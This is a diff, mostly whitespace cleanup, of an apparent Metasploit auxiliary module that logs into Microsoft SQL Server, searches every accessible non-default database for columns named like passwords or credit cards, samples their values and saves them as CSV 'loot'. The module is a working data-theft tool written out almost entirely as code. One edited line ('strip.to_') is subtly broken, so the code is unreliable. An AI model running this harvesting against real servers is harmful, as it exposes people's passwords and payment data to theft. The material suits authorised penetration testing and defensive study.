@@ -10,15 +10,15 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Microsoft SQL Server - Find and Sample Data',
-			'Description'    => %q{This script will search through all of the non-default databases 
-			on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS 
-			option. If column names are found that match the defined keywords and data is present 
-			in the associated tables, the script will select a sample of the records from each of 
+			'Description'    => %q{This script will search through all of the non-default databases
+			on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS
+			option. If column names are found that match the defined keywords and data is present
+			in the associated tables, the script will select a sample of the records from each of
 			the affected tables.  The sample size is determined by the SAMPLE_SIZE option, and results
-			output in a CSV format.  
-			
-			Thank you Dijininja for the IDF module which was my inspiration 
-			for this.  Also, thank you humble-desser, DarkOperator, HDM, and especially todb for 
+			output in a CSV format.
+
+			Thank you Dijininja for the IDF module which was my inspiration
+			for this.  Also, thank you humble-desser, DarkOperator, HDM, and especially todb for
 			helping me refine this MSF Module.
 			},
 			'Author'         => [ 'Scott Sutherland (nullbind) <scott.sutherland@netspi.com>' ],
@@ -30,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('KEYWORDS', [ true, 'Keywords to search for','passw|credit|card']),
-				OptInt.new('SAMPLE_SIZE', [ true, 'Number of rows to sample',  '1']),			
+				OptInt.new('SAMPLE_SIZE', [ true, 'Number of rows to sample',  '1']),
 			], self.class)
 	end
 
@@ -39,12 +39,12 @@ class Metasploit3 < Msf::Auxiliary
 		print_line("=" * str.length)
 	end
 
-	def run_host(ip)		
+	def run_host(ip)
 		sql_statement()
 	end
-	
+
 	def sql_statement()
-	
+
 		#DEFINED HEADER TEXT
 		headings = [
 			["Server","Database", "Schema", "Table", "Column", "Data Type", "Sample Data","Row Count"]
@@ -53,12 +53,12 @@ class Metasploit3 < Msf::Auxiliary
 		#DEFINE SEARCH QUERY AS VARIABLE
 		sql = "
 		-- CHECK IF VERSION IS COMPATABLE = > than 2000
-		IF (SELECT SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') as VARCHAR), 1, 
+		IF (SELECT SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') as VARCHAR), 1,
 		CHARINDEX('.',cast(SERVERPROPERTY('ProductVersion') as VARCHAR),1)-1)) > 0
 		BEGIN
-			
+
 			-- TURN OFF ROW COUNT
-			SET NOCOUNT ON;			
+			SET NOCOUNT ON;
 			--------------------------------------------------
 			-- SETUP UP SAMPLE SIZE
 			--------------------------------------------------
@@ -68,37 +68,37 @@ class Metasploit3 < Msf::Auxiliary
 			--------------------------------------------------
 			-- SETUP KEYWORDS TO SEARCH
 			--------------------------------------------------
-			DECLARE @KEYWORDS varchar(800);	
+			DECLARE @KEYWORDS varchar(800);
 			SET @KEYWORDS = '#{datastore['KEYWORDS']}|';
-			
+
 			--------------------------------------------------
 			--SETUP WHERE STATEMENT CONTAINING KEYWORDS
 			--------------------------------------------------
-			DECLARE @SEARCH_TERMS varchar(800);	
+			DECLARE @SEARCH_TERMS varchar(800);
 			SET @SEARCH_TERMS = ''; -- Leave this blank
 
 			-- START WHILE LOOP HERE -- BEGIN TO ITTERATE THROUGH KEYWORDS
-				
-				WHILE LEN(@KEYWORDS) > 0 
+
+				WHILE LEN(@KEYWORDS) > 0
 					BEGIN
 						--SET VARIABLES UP FOR PARSING PROCESS
 						DECLARE @change int
 						DECLARE @keyword varchar(800)
-							
+
 						--SET KEYWORD CHANGE TRACKER
-						SELECT @change = CHARINDEX('|',@KEYWORDS); 		
-							
-						--PARSE KEYWORD	
+						SELECT @change = CHARINDEX('|',@KEYWORDS);
+
+						--PARSE KEYWORD
 						SELECT @keyword = SUBSTRING(@KEYWORDS,0,@change) ;
-							
-						-- PROCESS KEYWORD AND GENERATE WHERE CLAUSE FOR IT	
+
+						-- PROCESS KEYWORD AND GENERATE WHERE CLAUSE FOR IT
 						SELECT @SEARCH_TERMS = 'LOWER(COLUMN_NAME) like ''%'+@keyword+'%'' or '+@SEARCH_TERMS
 
 						-- REMOVE PROCESSED KEYWORD
 						SET @KEYWORDS = SUBSTRING(@KEYWORDS,@change+1,LEN(@KEYWORDS));
-						
-					END			    		
-				-- REMOVE UNEEDED 					
+
+					END
+				-- REMOVE UNEEDED
 				SELECT @SEARCH_TERMS = SUBSTRING(@SEARCH_TERMS,0,LEN(@SEARCH_TERMS)-2);
 
 			--------------------------------------------------
@@ -107,21 +107,21 @@ class Metasploit3 < Msf::Auxiliary
 			USE master;
 
 			IF OBJECT_ID('tempdb..##mytable') IS NOT NULL DROP TABLE ##mytable;
-			IF OBJECT_ID('tempdb..##mytable') IS NULL 
-			BEGIN 
+			IF OBJECT_ID('tempdb..##mytable') IS NULL
+			BEGIN
 				CREATE TABLE ##mytable (
 					server_name varchar(800),
 					database_name varchar(800),
 					table_schema varchar(800),
-					table_name varchar(800),		
+					table_name varchar(800),
 					column_name varchar(800),
 					column_data_type varchar(800)
-				) 
+				)
 			END
 
 			IF OBJECT_ID('tempdb..##mytable2') IS NOT NULL DROP TABLE ##mytable2;
-			IF OBJECT_ID('tempdb..##mytable2') IS NULL 
-			BEGIN 
+			IF OBJECT_ID('tempdb..##mytable2') IS NULL
+			BEGIN
 				CREATE TABLE ##mytable2 (
 					server_name varchar(800),
 					database_name varchar(800),
@@ -131,13 +131,13 @@ class Metasploit3 < Msf::Auxiliary
 					column_data_type varchar(800),
 					column_value varchar(800),
 					column_data_row_count varchar(800)
-				) 
+				)
 			END
 
 			--------------------------------------------------
 			-- CURSOR1
-			-- ENUMERATE COLUMNS FROM EACH DATABASE THAT 
-			-- CONTAIN KEYWORD AND WRITE THEM TO A TEMP TABLE 
+			-- ENUMERATE COLUMNS FROM EACH DATABASE THAT
+			-- CONTAIN KEYWORD AND WRITE THEM TO A TEMP TABLE
 			--------------------------------------------------
 
 			-- SETUP SOME VARIABLES FOR THE MYCURSOR1
@@ -147,26 +147,26 @@ class Metasploit3 < Msf::Auxiliary
 			--------------------------------------------------------------------
 			-- CHECK IF ANY NON-DEFAULT DATABASE EXIST
 			--------------------------------------------------------------------
-			IF (SELECT count(*) 
-			FROM master..sysdatabases 
-			WHERE name NOT IN ('master','tempdb','model','msdb') 
-			and HAS_DBACCESS(name) <> 0) <> 0 
+			IF (SELECT count(*)
+			FROM master..sysdatabases
+			WHERE name NOT IN ('master','tempdb','model','msdb')
+			and HAS_DBACCESS(name) <> 0) <> 0
 			BEGIN
 				DECLARE MY_CURSOR1 CURSOR
 				FOR
 
-				SELECT name FROM master..sysdatabases 
-				WHERE name NOT IN ('master','tempdb','model','msdb') 
+				SELECT name FROM master..sysdatabases
+				WHERE name NOT IN ('master','tempdb','model','msdb')
 				and HAS_DBACCESS(name) <> 0;
 
 				OPEN MY_CURSOR1
 				FETCH NEXT FROM MY_CURSOR1 INTO @var1
-				WHILE @@FETCH_STATUS = 0   
-				BEGIN  	
+				WHILE @@FETCH_STATUS = 0
+				BEGIN
 				---------------------------------------------------
-				-- SEARCH FOR KEYWORDS/INSERT RESULTS INTO MYTABLE			
+				-- SEARCH FOR KEYWORDS/INSERT RESULTS INTO MYTABLE
 				---------------------------------------------------
-				SET @var2 = ' 	
+				SET @var2 = '
 				INSERT INTO ##mytable
 				SELECT @@SERVERNAME as SERVER_NAME,
 				TABLE_CATALOG as DATABASE_NAME,
@@ -175,15 +175,15 @@ class Metasploit3 < Msf::Auxiliary
 				COLUMN_NAME,
 				DATA_TYPE
 				FROM ['+@var1+'].[INFORMATION_SCHEMA].[COLUMNS] WHERE '
-				
+
 				--APPEND KEYWORDS TO QUERY
 				DECLARE @fullquery varchar(800);
-				SET @fullquery = @var2+@SEARCH_TERMS;				
-					
-				EXEC(@fullquery);	
+				SET @fullquery = @var2+@SEARCH_TERMS;
+
+				EXEC(@fullquery);
 				FETCH NEXT FROM MY_CURSOR1 INTO @var1
 
-				END   
+				END
 				CLOSE MY_CURSOR1
 				DEALLOCATE MY_CURSOR1
 				-------------------------------------------------
@@ -192,13 +192,13 @@ class Metasploit3 < Msf::Auxiliary
 				-- THAT MATCH THE DEFINED KEYWORDS
 				-- NOTE: THIS WILL NOT SAMPLE EMPTY TABLES
 				-------------------------------------------------
-				
+
 				IF (SELECT COUNT(*) FROM ##mytable) < 1
-					BEGIN	
+					BEGIN
 						SELECT 'No columns where found that match the defined keywords.' as Message;
 					END
 				ELSE
-					BEGIN			
+					BEGIN
 						DECLARE @var_server varchar(800)
 						DECLARE @var_database varchar(800)
 						DECLARE @var_table varchar(800)
@@ -207,7 +207,7 @@ class Metasploit3 < Msf::Auxiliary
 						DECLARE @var_column varchar(800)
 						DECLARE @myquery varchar(800)
 						DECLARE @var_column_data_row_count varchar(800)
-						
+
 						DECLARE MY_CURSOR2 CURSOR
 						FOR
 						SELECT server_name,database_name,table_schema,table_name,column_name,column_data_type
@@ -220,8 +220,8 @@ class Metasploit3 < Msf::Auxiliary
 							@var_table,
 							@var_column,
 							@var_column_data_type
-							WHILE @@FETCH_STATUS = 0   
-							BEGIN  
+							WHILE @@FETCH_STATUS = 0
+							BEGIN
 							----------------------------------------------------------------------
 							-- ADD AFFECTED SERVER/SCHEMA/TABLE/COLUMN/DATATYPE/SAMPLE DATA TO MYTABLE2
 							----------------------------------------------------------------------
@@ -232,21 +232,21 @@ class Metasploit3 < Msf::Auxiliary
 							-- CREATE TEMP TABLE TO GET THE COLUMN DATA ROW COUNT
 							IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount
 							CREATE TABLE #mycount(mycount varchar(800));
-							
+
 							-- SETUP AND EXECUTE THE COLUMN DATA ROW COUNT QUERY
-							SET @mycount_query = 'INSERT INTO #mycount SELECT DISTINCT 
+							SET @mycount_query = 'INSERT INTO #mycount SELECT DISTINCT
 												COUNT('+@var_column+') FROM '+@var_database+'.
 												'+@var_table_schema+'.'+@var_table;
 							EXEC(@mycount_query);
 
 							-- SET THE COLUMN DATA ROW COUNT
-							SELECT @mycount = mycount FROM #mycount;		
-							
-							-- REMOVE TEMP TABLE
-							IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount				
+							SELECT @mycount = mycount FROM #mycount;
 
-							SET @myquery = ' 	
-							INSERT INTO ##mytable2 
+							-- REMOVE TEMP TABLE
+							IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount
+
+							SET @myquery = '
+							INSERT INTO ##mytable2
 										(server_name,
 										database_name,
 										table_schema,
@@ -254,26 +254,26 @@ class Metasploit3 < Msf::Auxiliary
 										column_name,
 										column_data_type,
 										column_value,
-										column_data_row_count) 
+										column_data_row_count)
 							SELECT TOP '+@SAMPLE_COUNT+' ('''+@var_server+''') as server_name,
 										('''+@var_database+''') as database_name,
 										('''+@var_table_schema+''') as table_schema,
 										('''+@var_table+''') as table_name,
 										('''+@var_column+''') as comlumn_name,
 										('''+@var_column_data_type+''') as column_data_type,
-										'+@var_column+','+@mycount+' as column_data_row_count 
-							FROM ['+@var_database+'].['+@var_table_schema++'].['+@var_table+'] 
+										'+@var_column+','+@mycount+' as column_data_row_count
+							FROM ['+@var_database+'].['+@var_table_schema++'].['+@var_table+']
 							WHERE '+@var_column+' IS NOT NULL;
-							'	
+							'
 							EXEC(@myquery);
 
-							FETCH NEXT FROM MY_CURSOR2 INTO 
+							FETCH NEXT FROM MY_CURSOR2 INTO
 										@var_server,
 										@var_database,
 										@var_table_schema,
 										@var_table,@var_column,
 										@var_column_data_type
-							END   
+							END
 						CLOSE MY_CURSOR2
 						DEALLOCATE MY_CURSOR2
 
@@ -289,8 +289,8 @@ class Metasploit3 < Msf::Auxiliary
 								cast(column_name as char) as column_name,
 								cast(column_data_type as char) as column_data_type,
 								cast(column_value as char) as column_data_sample,
-								cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2 								
-							END	
+								cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2
+							END
 						ELSE
 							BEGIN
 								SELECT DISTINCT cast(server_name as CHAR) as server_name,
@@ -300,7 +300,7 @@ class Metasploit3 < Msf::Auxiliary
 								cast(column_name as char) as column_name,
 								cast(column_data_type as char) as column_data_type,
 								cast(column_value as char) as column_data_sample,
-								cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2 							
+								cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2
 							END
 					END
 			-----------------------------------
@@ -308,59 +308,59 @@ class Metasploit3 < Msf::Auxiliary
 			-----------------------------------
 			IF OBJECT_ID('tempdb..##mytable') IS NOT NULL DROP TABLE ##mytable;
 			IF OBJECT_ID('tempdb..##mytable2') IS NOT NULL DROP TABLE ##mytable2;
-				
+
 			END
 			ELSE
 			BEGIN
 				----------------------------------------------------------------------
 				-- RETURN ERROR MESSAGES IF THERE ARE NOT DATABASES TO ACCESS
 				----------------------------------------------------------------------
-				IF (SELECT count(*) FROM master..sysdatabases 
-				WHERE name NOT IN ('master','tempdb','model','msdb')) < 1	
+				IF (SELECT count(*) FROM master..sysdatabases
+				WHERE name NOT IN ('master','tempdb','model','msdb')) < 1
 					SELECT 'No non-default databases exist to search.' as Message;
 				ELSE
-					SELECT 'Non-default databases exist, 
-					but the current user does not have 
-					the privileges to access them.' as Message;				
+					SELECT 'Non-default databases exist,
+					but the current user does not have
+					the privileges to access them.' as Message;
 				END
 		END
 		else
 		BEGIN
 			SELECT 'This module only works on SQL Server 2005 and above.';
-		END	
-		
+		END
+
 		SET NOCOUNT OFF;"
-		
-				
-			
+
+
+
 		#STATUSING
 		print_line(" ")
 		print_status("Attempting to connect to the SQL Server at #{rhost}:#{rport}...")
-		
+
 		#CREATE DATABASE CONNECTION AND SUBMIT QUERY WITH ERROR HANDLING
 		begin
 			result = mssql_query(sql, false) if mssql_login_datastore
 			column_data = result[:rows]
-			print_status("Successfully connected to #{rhost}:#{rport}")			
+			print_status("Successfully connected to #{rhost}:#{rport}")
 		rescue
 			print_status ("Failed to connect to #{rhost}:#{rport}.")
 		return
-		end	
-		
+		end
+
 		#CREATE TABLE TO STORE SQL SERVER DATA LOOT
 		sql_data_tbl = Rex::Ui::Text::Table.new(
 			'Header'  => 'SQL Server Data',
 			'Ident'   => 1,
 			'Columns' => ['Server', 'Database', 'Schema', 'Table', 'Column', 'Data Type', 'Sample Data', 'Row Count']
-		)	
-		
-		#STATUSING		
+		)
+
+		#STATUSING
 		print_status("Attempting to retrieve data ...")
-					
-		if (column_data.count < 7) 
+
+		if (column_data.count < 7)
 			#Save loot status
 			save_loot="no"
-			
+
 			#Return error from SQL server
 			column_data.each { |row|
 				print_status("#{row.to_s.gsub("[","").gsub("]","").gsub("\"","")}")
@@ -372,21 +372,21 @@ class Metasploit3 < Msf::Auxiliary
 			save_loot="yes"
 			column_data.each { |row|
 				0.upto(7) { |col|
-					row[col] = row[col].strip.to_s	
-					}		
+					row[col] = row[col].strip.to_
+					}
 			}
 			print_line(" ")
 		end
-						
+
 		#SETUP ROW WIDTHS
-		widths = [0, 0, 0, 0, 0, 0, 0, 0]		
+		widths = [0, 0, 0, 0, 0, 0, 0, 0]
 		(column_data|headings).each { |row|
-			0.upto(7) { |col|				
-				widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col] 
+			0.upto(7) { |col|
+				widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col]
 			}
-		}		
-		
-		#PRINT HEADERS		
+		}
+
+		#PRINT HEADERS
 		buffer1 = ""
 		buffer2 = ""
 		headings.each { |row|
@@ -394,10 +394,10 @@ class Metasploit3 < Msf::Auxiliary
 				buffer1 += row[col].ljust(widths[col] + 1)
 				buffer2 += row[col]+ ","
 			}
-			print_line(buffer1)	
-			buffer2 = buffer2.chomp(",")+ "\n"	 		
+			print_line(buffer1)
+			buffer2 = buffer2.chomp(",")+ "\n"
 		}
-		
+
 		#PRINT DIVIDERS
 		buffer1 = ""
 		buffer2 = ""
@@ -406,12 +406,12 @@ class Metasploit3 < Msf::Auxiliary
 				divider = "=" * widths[col] + " "
 				buffer1 += divider.ljust(widths[col] + 1)
 			}
-			print_line(buffer1)				
+			print_line(buffer1)
 		}
-		
+
 		#PRINT DATA
 		buffer1 = ""
-		buffer2 = ""		
+		buffer2 = ""
 		print_line("")
 		column_data.each { |row|
 			0.upto(7) { |col|
@@ -419,17 +419,17 @@ class Metasploit3 < Msf::Auxiliary
 				buffer2 += row[col] + ","
 			}
 			print_line(buffer1)
-			buffer2 = buffer2.chomp(",")+ "\n"	
-			
+			buffer2 = buffer2.chomp(",")+ "\n"
+
 			#WRITE QUERY OUTPUT TO TEMP REPORT TABLE
-			sql_data_tbl << [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]] 
-					
+			sql_data_tbl << [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]]
+
 			buffer1 = ""
 			buffer2 = ""
-			print_line(buffer1)						
+			print_line(buffer1)
 		}
-		disconnect	
-			
+		disconnect
+
 		this_service = nil
 		if framework.db and framework.db.active
 			this_service = report_service(
@@ -439,14 +439,14 @@ class Metasploit3 < Msf::Auxiliary
 				:proto => 'tcp'
 			)
 		end
-			
+
 		#CONVERT TABLE TO CSV AND WRITE TO FILE
 		if (save_loot=="yes")
 			filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_sqlserver_query_results.csv"
 			path = store_loot("mssql.data", "text/plain", datastore['RHOST'], sql_data_tbl.to_csv, filename, "SQL Server query results",this_service)
 			print_status("Query results have been saved to: #{path}")
-		end		
-		
-	end	
-	
+		end
+
+	end
+
 end
